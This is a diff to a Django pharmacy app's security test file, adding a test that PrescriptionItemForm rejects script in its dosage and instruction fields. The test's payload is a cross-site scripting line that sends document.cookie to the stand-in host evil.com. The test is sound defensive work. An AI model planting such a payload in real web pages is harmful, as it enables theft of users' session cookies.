@@ -3,6 +3,7 @@ from django.urls import reverse
 
 from auth_app.models import Staff, UserAccount
 from medical_app.models import Encounter, Patient
+from .forms import PrescriptionItemForm
 from .models import Medicine, Prescription, PrescriptionItem
 from .utils import sign_prescription
 
@@ -102,3 +103,18 @@ class PharmacySecurityTest(TestCase):
 
 		with self.assertRaises(ValueError):
 			prescription.dispenseMedicine(self.pharmacist_staff)
+
+	def test_prescription_item_form_rejects_script_payload_fields(self):
+		payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+		form = PrescriptionItemForm(
+			data={
+				"medicineName": str(self.paracetamol.pk),
+				"dosage": payload,
+				"quantity": "1",
+				"instruction": payload,
+			}
+		)
+
+		self.assertFalse(form.is_valid())
+		self.assertIn("Dosage contains unsafe characters.", str(form.errors))
+		self.assertIn("Instruction contains unsafe characters.", str(form.errors))
